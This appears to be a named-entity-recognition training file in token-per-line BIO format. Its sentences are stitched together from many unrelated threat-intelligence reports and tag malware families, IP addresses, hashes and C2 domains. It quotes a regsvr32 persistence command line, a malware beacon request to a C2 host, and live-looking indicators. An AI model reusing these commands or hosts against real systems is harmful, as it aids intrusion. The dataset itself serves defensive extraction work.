to	O
expire	O
once	O
users	O
clickit	O
.	O

The	O
sample	O
communicates	O
with	O
a	O
command	O
&	O
control	O
server	O
in	O
Vietnam	O
,	O
and	O
exfiltrates	O
text	O
messages	O
to	O
a	O
Vietnamese	O
telephone	O
number	O
.	O

They	O
could	O
very	O
likely	O
be	O
the	O
threat	O
actors	O
themselves	O
,	O
testing	O
to	O
see	O
if	O
their	O
malware	O
is	O
detected	O
by	O
the	O
AV	O
companies	O
.	O

First	O
Seen	O
:	O

The	O
key	O
is	O
named	O
'	O
MSSecurity	O
'	O
and	O
executes	O
the	O
exact	O
same	O
command	O
line	O
as	O
the	O
infector	O
,	O
every	O
time	O
the	O
system	O
boots	O
-	O
'	O
'	O
regsvr32.exe	O
'	O
/s	O
/n	O
/i	O
'	O
%	O
APPDATA	O
%	O
\	O
%	O
DLLNAME	O
%	O
'	O
'	O
.	O

Exploitation	O
of	O
CVE-2017-11882	O

2	O

This	O
assessment	O
is	O
based	O
on	O
a	O
number	O
of	O
factors	O
,	O
but	O
chief	O
among	O
them	O
is	O
the	O
likelihood	O
that	O
a	O
military	O
member	O
would	O
only	O
trust	O
and	O
use	O
an	O
application	O
designed	O
to	O
calculate	O
something	O
as	O
critical	O
as	O
targeting	O
data	O
if	O
it	O
was	O
developed	O
and	O
promoted	O
by	O
a	O
member	O
of	O
their	O
own	O
forces	O
.	O

First	O
we	O
prepared	O
a	O
virtual	O
machine	O
environment	O
,	O
because	O
we	O
can	O
possibly	O
run	O
malicious	O
routines	O
from	O
the	O
sample	O
.	O

One	O
of	O
them	O
attracted	O
our	O
attention	O
because	O
it	O
implements	O
a	O
bypass	O
for	O
security	O
solutions	O
we	O
have	O
never	O
seen	O
before	O
.	O

RECONNAISSANCE	O

Please	O
run	O
freshclam	O
to	O
ensure	O
you	O
stay	O
updated	O
with	O
the	O
latest	O
coverage	O
.	O

Figure	O
7	O
:	O

Threat	O
Connect	O
Threat	O
Intelligence	O
Platform	O
Why	O
Threat	O
Intelligence	O
is	O
Important	O
How	O
to	O
Develop	O
Threat	O
Intelligence	O
Community	O
Collaboration	O
Case	O
Study	O
Capabilities	O
Integrations	O
ThreatConnectTM	O
API	O
ThreatConnectTM	O
Cloud	O
Cloud	O
Security	O
Upgrade	O
Communities	O
Private	O
Communities	O
Moderated	O
Common	O
Community	O
Moderated	O
Subscriber	O
Communities	O
Intelligence	O
Research	O
Team	O
Data	O
Privacy	O
Diamond	O
Model	O
of	O
Intrusion	O
Analysis	O
Threat	O
Inference	O
Engine	O
Collaborative	O
Intelligence	O
In	O
The	O
News	O
Press	O
Releases	O
Blog	O
Leadership	O
Careers	O
Contact	O
Us	O
News	O
&	O
Events	O
Methodology	O
About	O
Login	O
Home	O
News	O

Many	O
others	O
have	O
also	O
contributed	O
to	O
research	O
on	O
Syrian	O
malware	O
,	O
from	O
Telecomix	O
to	O
a	O
range	O
of	O
security	O
companies	O
.	O

The	O
virtual	O
terminal	O
looks	O
familiar	O
(	O
Figure	O
22	O
)	O
,	O
but	O
uses	O
Linux	O
commands	O
instead	O
of	O
Windows	O
because	O
they	O
are	O
ultimately	O
interpreted	O
by	O
the	O
underlying	O
operating	O
system	O
.	O

01	O
–	O
Index	O
size	O
,	O
1	O
.	O

This	O
malicious	O
document	O
shared	O
by	O
Brian	O
triggered	O
this	O
investigation	O
and	O
helped	O
me	O
in	O
identifying	O
the	O
related	O
Emails	O
and	O
related	O
documents	O
associated	O
with	O
this	O
cyber	O
attack	O
.	O

Forensic	O
tool-marks	O
in	O
the	O
CRC	O
algorithm	O
can	O
be	O
traced	O
to	O
Chinese	O
origin	O
.	O

A	O
partial	O
list	O
of	O
fi	O
les	O
and	O
the	O
number	O
of	O
hits	O
can	O
be	O
seen	O
in	O
the	O
image	O
below	O
:	O
Another	O
interesting	O
aspect	O
is	O
that	O
attackers	O
often	O
reset	O
the	O
download	O
counters	O
along	O
with	O
the	O
IP	O
Logs	O
that	O
keep	O
a	O
record	O
of	O
the	O
targeted	O
victims	O
of	O
different	O
campaigns	O
.	O

The	O
DarkComet	B-malware.backdoor
sample	O
upon	O
which	O
we	O
will	O
primarily	O
focus	O
on	O
today	O
is	O
462,848	O
bytes	O
in	O
size	O
and	O
has	O
an	O
MD5	O
hash	O
of	O

'	O
--	O
-C	O
'	O
in	O
case	O
'	O
Logout	O
'	O
(	O
close	O
)	O
event	O
occurred	O
,	O
or	O
'	O
--	O
-N	O
'	O
if	O
neither	O
of	O
the	O
events	O
occurred	O
,	O
e.g.	O
:	O

Deceptive	O
Man-in-the-Middle	O

In	O
recent	O
days	O
,	O
various	O
malware	O
samples	O
have	O
been	O
uploaded	O
to	O
malware	O
repositories	O
which	O
appear	O
to	O
originate	O
from	O
the	O
intrusion	O
.	O

The	O
check	O
for	O
access	O
rights	O
effectively	O
checks	O
to	O
see	O
if	O
the	O
server	O
variant	O
process	O
is	O
running	O
under	O
the	O
NT	O
Authority	O
.	O

thread	O
begins	O
by	O
establishing	O
the	O
set	O
of	O
internal	O
command	O
handlers	O
available	O
to	O
the	O
server	O
variant	O
.	O

There	O
are	O
several	O
modules	O
designed	O
to	O
gather	O
personal	O
information	O
about	O
the	O
victim	O
,	O
including	O
contacts	O
,	O
photos	O
,	O
call	O
logs	O
,	O
SMS	O
,	O
as	O
well	O
as	O
information	O
about	O
the	O
mobile	O
device	O
,	O
such	O
as	O
geolocation	O
,	O
Android	O
version	O
,	O
device	O
model	O
,	O
network	O
operator	O
,	O
and	O
phone	O
numbers	O
.	O

Implication	O
:	O
Financial	O
losses	O
due	O
to	O
process	O
downtime	O
and	O
complex	O
plant	O
start	O
up	O
procedure	O
after	O
the	O
shutdown	O
.	O

Jan	O
26th	O
2003	O

The	O
highlighted	O
bytes	O
represent	O
the	O
scrambled	O
computer	O
info	O
Figure	O
22	O
.	O

At	O
this	O
point	O
,	O
the	O
actual	O
process	O
of	O
decryption	O
is	O
performed	O
.	O

Afterward	O
,	O
the	O
keep-alive	O
packets	O
between	O
the	O
victim	O
and	O
controller	O
maintained	O
the	O
connection	O
,	O
which	O
allowed	O
me	O
to	O
test	O
the	O
functionality	O
of	O
with	O
the	O
custom	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
controller	O
.	O

The	O
payload	O
of	O
each	O
destined	O
packet	O
contains	O
the	O
following	O
header	O
:	O

After	O
authenticating	O
,	O
the	O
malware	O
sends	O
e-mails	O
to	O
another	O
specified	O
e-mail	O
address	O
,	O
and	O
reads	O
e-mails	O
from	O
the	O
inbox	O
.	O

Additionally	O
,	O
the	O
configuration	O
is	O
stored	O
embedded	O
in	O
the	O
binary	O
,	O
not	O
as	O
a	O
separate	O
XML	O
file	O
in	O
the	O
manner	O
of	O
newer	O
CozyDuke	B-malware.drop
versions	O
.	O

T	O
his	O
router	O
uses	O
version	O
6.34	O
.	O

The	O
RunAtLoad	O
key	O
will	O
command	O
launchd	O
to	O
run	O
the	O
daemon	O
when	O
the	O
operating	O
system	O
starts	O
up	O
,	O
while	O
the	O
KeepAlive	O
key	O
will	O
command	O
launchd	O
to	O
let	O
the	O
process	O
run	O
indefinitely	O
.	O

The	O
US	O
government	O
reports	O
that	O
Bankshot	O
is	O
used	O
by	O
Hidden	B-malware.unknown
Cobra	I-malware.unknown
to	O
target	O
multiple	O
industries	O
including	O
financial	O
organizations	O
.	O

Figure	O
2	O

systemd	O
Vulnerability	O
Leads	O
to	O
Denial	O
of	O
Service	O
on	O
Linux	O
qkG	B-malware.ransom
Filecoder	I-malware.ransom
:	O
Self-Replicating	O
,	O
Document-Encrypting	O
Ransomware	O
Mitigating	O
CVE-2017-5689	O
,	O
an	O
Intel	O
Management	O
Engine	O
Vulnerability	O
A	O
Closer	O
Look	O
at	O
North	O
Korea	O
's	O
Internet	O
From	O
Cybercrime	O
to	O
Cyberpropaganda	O

PTL.AYM	O
is	O
in	O
fact	O
another	O
binary	O
file	O
;	O
specifically	O
,	O
it	O
is	O
a	O
DLL	O
file	O
with	O
the	O
following	O
properties	O
:	O

The	O
entrypoint	O
function	O
varies	O
,	O
but	O
is	O
always	O
specified	O
in	O
the	O
dropper	O
configuration	O
.	O

This	O
APT	O
attack	O
was	O
analyzed	O
and	O
attributed	O
upon	O
the	O
detection	O
and	O
we	O
now	O
confirmed	O
its	O
association	O
with	O
the	O
APT-C-06	O
Group	O
.	O

The	O
email	O
was	O
sent	O
from	O
the	O
IP	O
address	O
43.249.39.152	B-ip.unknown
,	O
in	O
Singapore	O
,	O
on	O
December	O
28	O
at	O
23:34	O
.	O

Specifically	O
,	O
according	O
to	O
the	O
author	O
,	O
the	O
'	O
server	O
'	O
component	O
is	O
the	O
malware	O
that	O
resides	O
on	O
victim	O
endpoints	O
that	O
connect	O
to	O
the	O
'	O
client	O
'	O
,	O
which	O
is	O
operated	O
by	O
the	O
attacker	O
from	O
one	O
or	O
more	O
remote	O
command-and-control	O
(	O
CnC	O
)	O
systems	O
.	O

Some	O
victims	O
of	O
Operation	B-malware.ransom
Manul	I-malware.ransom
have	O
expressed	O
a	O
desire	O
to	O
preserve	O
their	O
anonymity	O
,	O
which	O
we	O
respect	O
.	O

Among	O
these	O
tools	O
are	O
two	O
backdoors	O
that	O
exploited	O
DLL	O
sideloading	O
attack	O
in	O
Microsoft	O
,	O
Google	O
and	O
Kaspersky	O
applications	O
.	O

926235FCF7B91442A405B5760A0729EB	B-hash
helpme.no-ip.biz	B-url.cncsvr

This	O
comes	O
at	O
a	O
time	O
when	O
the	O
demand	O
for	O
services	O
is	O
stronger	O
than	O
ever	O
and	O
increasing	O
daily	O
.	O

2	O
Jan	O
.	O

2BCDC5091C446E8B6888D802A3589E09	B-hash
loading.myftp.org	B-url.cncsvr
US	O

One	O
of	O
the	O
common	O
malware	O
samples	O
used	O
over	O
the	O
course	O
of	O
Operation	B-malware.ransom
Manul	I-malware.ransom
is	O
known	O
as	O
JRat	B-malware.backdoor
or	O
Jacksbot	O
.	O

The	O
number	O
originates	O
from	O
India	O
and	O
uses	O
the	O
'	O
Vodafone	O
India	O
'	O
network	O
with	O
roaming	O
capability	O
disabled	O
.	O

ACTIONABLE	O
INTELLIGENCE	O

Moreover	O
,	O
these	O
APT	B-malware.unknown
campaigns	O
were	O
not	O
limited	O
to	O
western	O
countries	O
.	O

The	O
original	O
project	O
was	O
built	O
as	O
a	O
command	O
line	O
utility	O
with	O
the	O
target	O
process	O
identifier	O
provided	O
as	O
an	O
argument	O
.	O

Unknown	O
0x89CF98B1	O
rndismpc	O
'	O
Action	O
'	O
'	O
rndismpc	O
'	O
Stuxnet.a	O
0xAE240682	O
MRxCls	O
'	O
Data	O
'	O
'	O
MRxClsDvX	O
'	O
Stuxnet.b/.c	O
0xAE240682	O
MRxCls	O
'	O
Data	O
'	O
'	O
MRxClsDvX	O
'	O
Unknown	O
0xAE240682	O
rtniczw	O
'	O
Config	O
'	O
'	O
RealTekDev291	O
'	O
Unknown	O
0xAE240682	O
jmidebs	O
Duqu	O
Duqu	B-malware.infosteal
0xAE240682	O
0x20F546D3	O
'	O
IDE	O
'	O
{	O
3093983-109232-29291	O
}	O
'	O
FILTER	O
'	O
{	O
3093AAZ3-1092-2929-'FILTER	O
'	O
{	O
624409B3-4CEF-41c0-8B81-7634279A41E5	O
}	O
9391	O
}	O

Here	O
are	O
a	O
few	O
things	O
you	O
can	O
do	O
to	O
avoid	O
being	O
manipulated	O
like	O
this	O
into	O
downloading	O
spyware	O
:	O

At	O
the	O
bottom	O
was	O
a	O
link	O
saying	O
'	O
Here	O
For	O
Watch	O
It	O
!	O

The	O
campaign	O
against	O
Ablyazov	O
's	O
associates	O
used	O
the	O
same	O
malware	O
as	O
we	O
found	O
in	O
Operation	B-malware.ransom
Manul	I-malware.ransom
,	O
and	O
sometimes	O
used	O
the	O
exact	O
same	O
emails	O
as	O
the	O
emails	O
sent	O
to	O
EFF	O
's	O
Respublika	O

German	O
Bundestag	O
&	O
Political	O
Parties	O
JUNE	O
2015	O
Germany	O
's	O
Federal	O
Office	O
for	O
Security	O
in	O
Information	O
Technology	O
(	O
BSI	O
)	O
announced	O
that	O
APT28	B-malware.infosteal
was	O
likely	O
responsible	O
for	O
the	O
spear	O
phishing	O
emails	O
sent	O
to	O
members	O
of	O
several	O
German	O
political	O
parties	O
.	O

Most	O
and	O
major	O
American	O
top	O
Gartner	O
Antivirus	O
companies	O
did	O
not	O
detect	O
it	O
!	O
!	O

Malware	O
then	O
reads	O
the	O
c2	O
response	O
and	O
from	O
the	O
C2	O
response	O
it	O
extracts	O
two	O
things	O
a	O
)	O
filename	O
and	O
b	O
)	O
the	O
command	O
string	O
that	O
will	O
trigger	O
the	O
download	O
functionality	O
.	O

By	O
limiting	O
their	O
use	O
of	O
malware	O
,	O
groups	O
such	O
as	O
Chafer	O
hope	O
to	O
be	O
less	O
conspicuous	O
on	O
a	O
victim	O
's	O
network	O
and	O
,	O
if	O
discovered	O
,	O
make	O
their	O
attack	O
more	O
di cult	O
to	O
attribute	O
.	O

The	O
developer	O
crafted	O
Office	O
Word	O
and	O
Excel	O
documents	O
to	O
see	O
the	O
detection	O
in	O
VirusTotal	O
.	O

TRITON	B-malware.infosteal
is	O
also	O
designed	O
to	O
communicate	O
using	O
the	O
proprietary	O
TriStation	O
protocol	O
which	O
is	O
not	O
publicly	O
documented	O
suggesting	O
the	O
adversary	O
independently	O
reverse	O
engineered	O
this	O
protocol	O
.	O

Contact	O
information	O
:	O
BM-2cVcZL1xfve1yGGKwEBgG1ge6xJ5PYGfGw@bitmessage.ch	O
reserve	O
:	O
BM-2cT4U1vBdjfqKDeWMEXgCWs9SfnMK1GLTF@bitmessage.ch	O

In	O
a	O
recent	O
wave	O
,	O
a	O
bit.ly	O
link	O
(	O
https://bitly[.]com/1YRoIPX)	O
was	O
used	O
instead	O
of	O
a	O
direct	O
link	O
to	O
the	O
malware	O
(	O
bit.ly	O
is	O
a	O
legitimate	O
URL	O
shortening	O
service	O
)	O
.	O

While	O
our	O
work	O
highlights	O
the	O
human	O
rights	O
ramifications	O
of	O
the	O
mis-use	O
of	O
this	O
technology	O
,	O
it	O
is	O
clear	O
that	O
there	O
are	O
broader	O
concerns	O
.	O

This	O
differs	O
from	O
sample	O
to	O
sample	O
.	O

Once	O
the	O
script	O
runs	O
,	O
it	O
passes	O
the	O
decoded	O
script	O
from	O
the	O
image	O
 le	O
to	O
the	O
Windows	O
command	O
line	O
in	O
a	O
variable	O
$	O
x	O
,	O
which	O
uses	O
cmd.exe	O
to	O
execute	O
the	O
obfuscated	O
script	O
and	O
run	O
it	O
via	O
PowerShell	O
.	O

This	O
can	O
also	O
be	O
used	O
to	O
monitor	O
deletes	O
,	O
with	O
an	O
alert	O
configured	O
to	O
fire	O
on	O
excessive	O
deletes	O
in	O
a	O
row	O
;	O
•	O
Windows	O
Security	O
Event	O
logs	O
should	O
be	O
monitored	O
to	O
capture	O
Scheduled	O
Task	O
creation	O
events	O
–	O
Event	O
ID	O
4698	O
;	O
•	O
Registry	O
Auditing	O
should	O
be	O
enabled	O
and	O
monitored	O
to	O
capture	O
any	O
additions	O
to	O

A	O
200.63.46.23	B-ip.unknown
5	O
www.dexterseason.com	B-url.unknown
.	O

The	O
real	O
application	O
is	O
created	O
by	O
keineantwort.de	O
and	O
we	O
have	O
verified	O
it	O
from	O
their	O
main	O
website	O
:	O
Going	O
back	O
to	O
(	O
AndroidManifest.xml	O
)	O
file	O
,	O
the	O
malware	O
register	O
itself	O
as	O
receiver	O
of	O
almost	O
all	O
intents	O
and	O
request	O
almost	O
all	O
permissions	O
available	O
in	O
Android	O
system	O
!	O

A	O
sample	O
phishing	O
email	O
is	O
shown	O
in	O
Figure	O
15	O
.	O

If	O
'	O
dwBuildNumber	O
'	O
is	O
equal	O
to	O
2	O
(	O
V	O
ER_	O
PLATFORM_WIN32_NT	O
)	O
and	O
'	O
dwMajorVersion	O
'	O
is	O
less	O
than	O
6	O
(	O
prior	O
to	O
Windows	O
Vista	O
)	O
it	O
adds	O
following	O
entry	O
for	O
persistence	O
:	O

The	O
module	O
transmits	O
the	O
collected	O
information	O
in	O
the	O
body	O
of	O
the	O
POST	O
request	O
and	O
gets	O
new	O
commands	O
from	O
the	O
server	O
's	O
response	O
.	O

According	O
to	O
Insikt	O
Group	O
's	O
source	O
,	O
the	O
Iranian	O
government	O
authorized	O
denial-of-service	O
attacks	O
on	O
America	O
's	O
largest	O
financial	O
services	O
companies	O
as	O
an	O
immediate	O
response	O
to	O
the	O
sanctions	O
in	O
a	O
campaign	O
dubbed	O
Operation	O
Ababil	O
.	O

Parallel	O
and	O
Previous	O
Research	O

At	O
this	O
point	O
,	O
the	O
ZxShell	B-malware.backdoor
library	O
is	O
no	O
longer	O
linked	O
in	O
the	O
module	O
list	O
of	O
the	O
host	O
process	O
.	O

SCR/EXE	O
files	O
-	O
used	O
in	O
spearphishing/social	O
engineering	O
:	O

'	O
를	O
보내	O
정상	O
서버	O
여부를	O
확인한다	O
.	O

GET	O
/login	O
?	O
wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q-H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH-nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ==	O
HTTP/1.1	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
7.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
Trident/4.0	O
;	O
.NET	O
CLR	O
2.0.50727	O
;	O
.NET	O
CLR	O
3.0.4506.2152	O
;	O
.NET	O
CLR	O
3.5.30729	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
Host	O
:	O
www.microsoftservices.proxydns.com	B-url.unknown
Cache-Control	O
:	O
no-cache	O

The	O
new	O
process	O
is	O
easier	O
to	O
be	O
neglected	O
due	O
to	O
the	O
host	O
firewall	O
.	O

Advanced	O
Malware	O
Protection	O
(	O
AMP	O
)	O
is	O
ideally	O
suited	O
to	O
detect	O
the	O
sophisticated	O
malware	O
used	O
by	O
this	O
threat	O
actor	O
.	O

This	O
module	O
has	O
been	O
written	O
in	O
c	O
and	O
includes	O
several	O
specifi	O
c	O
methods	O
and	O
encodings	O
that	O
provide	O
forensic	O
track-ability	O
.	O

58F74545D47F5DA1ECF3093F412D7D9544A33D36430AB1AF709D835A5	O
9184611	O

It	O
could	O
be	O
that	O
the	O
hacker	O
decided	O
to	O
block	O
the	O
connection	O
after	O
seeing	O
the	O
result	O
of	O
these	O
commands	O
.	O

15jXmdeh15nXnQ==	O
15HXmdeY15fXldeg15nXnQ==	O
15DXkdeY15fXlA==	O
157XqdeqJyfXpA==	O

11	O

We	O
were	O
unable	O
to	O
determine	O
whether	O
this	O
DLL	O
was	O
created	O
specifically	O
by	O
the	O
malware	O
author	O
,	O
or	O
if	O
it	O
was	O
from	O
another	O
source	O
,	O
such	O
as	O
example	O
code	O
or	O
a	O
particular	O
custom	O
ICS	O
implementation	O
.	O

It	O
does	O
this	O
by	O
first	O
parsing	O
files	O
in	O
the	O
IE	O
History	O
folder	O
.	O

Web	O
.	O

3	O
Ghostrat은	B-malware.backdoor
중앙관리	O
솔루션	O
A의	O
취약점을	O
이용하여	O
파일	O
배포	O
기능을	O
통해	O
감염을	O
시도하는	O
악성코드로	O
,	O
대기업	O
해킹에	O
이용된	O
GhostRat	B-malware.backdoor
악성코드에	O
의해	O
유출된	O
문서는	O
약	O
4만여건으로	O
확인되었다	O
.	O

Accenture	O
,	O
the	O
Accenture	O
logo	O
,	O
iDefense	O
and	O
other	O
trademarks	O
,	O
service	O
marks	O
,	O
and	O
designs	O
are	O
registered	O
or	O
unregistered	O
trademarks	O
of	O
Accenture	O
and	O
its	O
subsidiaries	O
in	O
the	O
United	O
States	O
and	O
in	O
foreign	O
countries	O
.	O

https://elsa-jp.jp.	B-url.unknown

Irrespective	O
of	O
the	O
threats	O
sophistication	O
or	O
motivation	O
,	O
South	O
Asian	O
cyber	O
threats	O
are	O
likely	O
emulating	O
behaviors	O
of	O
larger	O
regional	O
powers	O
to	O
strategically	O
influence	O
national	O
,	O
organizational	O
or	O
individual	O
objectives	O
.	O

I	O
thought	O
it	O
was	O
interesting	O
the	O
backdoor	O
used	O
a	O
secondary	O
backup	O
backdoor	O
in	O
addition	O
to	O
its	O
primary	O
payload	O
.	O

A	O
patched	O
version	O
of	O
the	O
popular	O
Adblock	O
Plus	O
chrome	O
extension	O
is	O
used	O
to	O
inject	O
both	O
the	O
in-browser	O
crypto-mining	O
module	O
(	O
based	O
on	O
CryptoNoter	O
)	O
and	O
the	O
in-browser	O
payment	O
hijacking	O
module	O
.	O

The	O
group	O
demonstrates	O
malleability	O
and	O
innovation	O
in	O
maintaining	O
and	O
producing	O
familiar	O
SPLM	B-malware.backdoor
functionality	O
,	O
but	O
the	O
pragmatic	O
and	O
systematic	O
approach	O
towards	O
producing	O
undetected	O
or	O
difficult-to-detect	O
malware	O
continues	O
.	O

Enforce	O
secure	O
network	O
authentication	O
where	O
possible	O
.	O

Nevertheless	O
the	O
certificate	O
is	O
useful	O
for	O
us	O
,	O
as	O
it	O
can	O
be	O
used	O
to	O
find	O
related	O
cases	O
.	O

ServiceDll	O
and	O
ServiceDllUnloadOnStop	O
are	O
needed	O
for	O
services	O
that	O
run	O
in	O
a	O
shared	O
process	O
.	O

This	O
sample	O
however	O
is	O
associated	O
with	O
the	O
same	O
C2	O
servers	O
used	O
by	O
Operation	B-malware.ransom
Manul	I-malware.ransom
.	O

Indicators	O
of	O
compromise	O
(	O
IoC	O
)	O

The	O
Christian	O
Science	O
Monitor	O
.	O

STRINGTABLE	O
LANGUAGE	O
LANG_CHINESE	O
,	O
0x2	O
103	O
,	O
'	O
NewCT2	B-malware.backdoor
'	O
106	O
,	O
'	O
Hello	O
World	O
!	O
'	O

Dynamic	O
DNS	O
is	O
a	O
key	O
feature	O
of	O
the	O
operation	O
,	O
with	O
many	O
known	O
C	O
&	O
C	O
servers	O
operating	O
from	O
domains	O
registered	O
through	O
Peng	O
Yong	O
's	O
3322.org	O
service	O
.	O

,	O
supposedly	O
a	O
female	O
student	O
,	O
engaged	O
in	O
an	O
online	O
romance	O
with	O
a	O
target	O
whose	O
handle	O
was	O
,	O
describing	O
himself	O
as	O
living	O
in	O
South	O
Asia	O
working	O
in	O
garments	O
manufacturing	O
and	O
wholesaling	O
.	O

Any	O
C	O
&	O
C	O
communications	O
will	O
involve	O
encrypted	O
tra c	O
to	O
a	O
known	O
website	O
,	O
meaning	O
it	O
is	O
less	O
likely	O
to	O
raise	O
 ags	O
on	O
targeted	O
networks	O
.	O

2	O
Jan	O
.	O

Targeted	O
Attack	O
Campaigns	O
Profiling	O

The	O
threat	O
group	O
also	O
reportedly	O
targeted	O
the	O
German	O
parliament	O
and	O
German	O
Chancellor	O
Angela	O
Merkel	O
's	O
Christian	O
Democratic	O
Union	O
party	O
.	O

Exhibit	O
1	O
:	O
Dropper	O
Document	O

Some	O
of	O
the	O
payload	O
names	O
include	O
:	O

Considering	O
the	O
relationship	O
between	O
this	O
attack	O
and	O
Cobalt	O
Strike	O
platform	O
,	O
we	O
name	O
it	O
as	O
APT-TOCS	B-malware.infosteal
(	O
TOCS	O
refers	O
to	O
Threat	O
on	O
Cobalt	O
Strike	O
.	O
)	O

客户端技术	O
(	O
1	O
)	O

It	O
could	O
be	O
a	O
security	O
mechanism	O
implemented	O
by	O
the	O
attackers	O
to	O
make	O
hard	O
the	O
investigation	O
of	O
security	O
firms	O
.	O

In	O
order	O
to	O
infect	O
the	O
users	O
associated	O
with	O
Mazagon	O
Dock	O
Shipbuilders	O
Limited	O
(	O
MDL	O
)	O
,	O
the	O
attackers	O
distributed	O
spear-phishing	O
emails	O
containing	O
malicious	O
excel	O
file	O
which	O
when	O
opened	O
drops	O
a	O
malware	O
capable	O
of	O
spying	O
on	O
infected	O
systems	O
.	O

However	O
,	O
public	O
attribution	O
of	O
these	O
activities	O
to	O
RIS	O
is	O
supported	O
by	O
technical	O
indicators	O
from	O
the	O
U.S.	O
Intelligence	O
Community	O
,	O
DHS	O
,	O
FBI	O
,	O
the	O
private	O
sector	O
,	O
and	O
other	O
entities	O
.	O

Файл	O
создан	O
в	O
более	O
новой	O
версии	O
программы	O
Микрософт	O
Office	O
.	O

-	O
DrWeb	O
Even	O
the	O
identifying	O
information	O
that	O
the	O
backdoor	O
seeks	O
from	O
a	O
system	O
is	O
not	O
decrypted	O
until	O
runtime	O
.	O

Similar	O
Targets	O
were	O
observed	O
where	O
the	O
threat	O
actors	O
utilized	O
this	O
backdoor	O
.	O

While	O
detection	O
is	O
done	O
quickly	O
,	O
attribution	O
for	O
these	O
campaigns	O
is	O
often	O
an	O
open	O
and	O
hard	O
problem	O
to	O
solve	O
.	O

Note	O
that	O
the	O
Indian	O
attack	O
does	O
not	O
make	O
use	O
of	O
this	O
middle-stage	O
dropper	O
,	O
but	O
directly	O
installs	O
and	O
launches	O
the	O
Windows	O
service	O
instead	O
.	O

ProductVersion	O
:	O
5	O
,	O
1	O
,	O
2600	O
,	O
0	O
Child	O
Type	O
:	O
VarFileInfo	O
Translation	O
:	O
1033/1200	O

Let	O
's	O
start	O
reversing	O
by	O
loading	O
a	O
process	O
memory	O
dump	O
of	O
the	O
running	O
bot	O
in	O
IDA	O
Pro	O
.	O

OfficeScan	O
's	O
Vulnerability	O
Protection	O
shields	O
endpoints	O
from	O
identified	O
and	O
unknown	O
vulnerability	O
exploits	O
even	O
before	O
patches	O
are	O
deployed	O
.	O

Thu	O
Aug	O
06	O
05:34:53	O
2015	O
Mon	O
Mar	O
01	O
10:28:24	O
2010	O
Thu	O
Aug	O
06	O
04:47:17	O
2015	O
Wed	O
Apr	O
22	O
04:58:34	O
2015	O
Mon	O
Sep	O
07	O
01:54:17	O
2015	O
Wed	O
Apr	O
22	O
04:58:34	O
2015	O
Trojan.CryptRedol	O
None	O
Trojan.CryptRedol	O
.	O

As	O
the	O
Mabna	O
Institute	O
indictments	O
highlight	O
,	O
despite	O
the	O
lifting	O
of	O
sanctions	O
and	O
an	O
appetite	O
to	O
re-engage	O
with	O
the	O
international	O
community	O
,	O
Iran	O
has	O
continued	O
a	O
subversive	O
and	O
aggressive	O
global	O
cyber	O
operations	O
campaign	O
.	O

Due	O
to	O
LuckyMouse	O
's	O
ongoing	O
waterholing	O
of	O
government	O
websites	O
and	O
the	O
corresponding	O
dates	O
,	O
we	O
suspect	O
that	O
one	O
of	O
the	O
aims	O
of	O
this	O
campaign	O
is	O
to	O
access	O
web	O
pages	O
via	O
the	O
data	O
center	O
and	O
inject	O
JavaScripts	O
into	O
them	O
.	O

Below	O
are	O
details	O
on	O
each	O
of	O
the	O
malware	O
files	O
.	O

The	O
actor	O
was	O
linked	O
to	O
a	O
destructive	O
operation	O
,	O
which	O
used	O
NewsBeef	B-malware.infosteal
and	O
StoneDrill	B-malware.backdoor
malware	O
families	O
.	O

This	O
brings	O
us	O
to	O
the	O
next	O
'	O
hide	O
in	O
plain	O
sight	O
'	O
tactic	O
we	O
noticed	O
.	O

Note	O
that	O
the	O
apparent	O
sender	O
has	O
an	O
e-mail	O
address	O
that	O
indicates	O
that	O
it	O
was	O
being	O
sent	O
by	O
'	O
Melissa	O
Chan	O
,	O
'	O
who	O
is	O
a	O
real	O
correspondent	O
for	O
Aljazeera	O
English	O
.	O

Even	O
though	O
the	O
macro	O
is	O
password	O
protected	O
,	O
It	O
is	O
possible	O
to	O
extract	O
macro	O
code	O
using	O
analysis	O
tools	O
like	O
oletools	O
.	O

Once	O
APT28	B-malware.backdoor
and	O
APT29	B-malware.backdoor
have	O
access	O
to	O
victims	O
,	O
both	O
groups	O
exfiltrate	O
and	O
analyze	O
information	O
to	O
gain	O
intelligence	O
value	O
.	O

Since	O
then	O
,	O
several	O
examples	O
of	O
malware	O
created	O
by	O
Animal	O
Farm	O
have	O
been	O
found	O
and	O
publicly	O
documented	O
,	O
in	O
particular	O
:	O
Casper	B-malware.unknown
,	O
a	O
stealthy	O
first­stage	O
implant	O
,	O
documented	O
by	O
ESET	O
in	O
last	O
March	O

Software-enforced	O
DEP	O
can	O
help	O
prevent	O
malicious	O
code	O
from	O
taking	O
advantage	O
of	O
exception-handling	O
mechanisms	O
in	O
Windows	O
.	O

PCCCMDPacketHeader	O
and	O
any	O
optional	O
payload	O
data	O
.	O

Employing	O
anti-debugging	O
and	O
anti-sandboxing	O
techniques	O
Runtime	O
API	O
Address	O
resolver	O
Covert	O
DLL	O
injection	O
of	O
the	O
RAT	B-malware.backdoor
library	O
Persistence	O
file	O
on	O
disk	O

We	O
continued	O
to	O
chase	O
that	O
hunch	O
during	O
the	O
frenetic	O
early	O
analysis	O
phase	O
and	O
shared	O
this	O
gut	O
feeling	O
of	O
a	O
similarity	O
between	O
ExPetr	O
and	O
BlackEnergy	O
with	O
our	O
friends	O
at	O
Palo	O
Alto	O
Networks	O
.	O

Attached	O
is	O
the	O
proof	O
of	O
transfer	O
Iremit	O
Transfer	O
Error	O
Page	O
With	O
warm	O
regards	O
Branch	O
Manager	O
Head	O
Office	O
BDBL	O
Building	O
(	O
8th	O
-	O
10th	O
&	O
16th	O
-	O
19th	O
Floor	O
)	O
8	O
,	O
Rajuk	O
Avenue	O
G.P.O	O
Box	O
–	O
2229	O
Dhaka-1000	O
Bangladesh	O
Telephone	O
:	O
95603820	O
Fax	O
:	O
880-2-95602085	O
880-2-716344	O
Swift	O
:	O
IFIC	O
BD	O
DH	O
E-mail	O
:	O
swift@ificbankbd.com	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
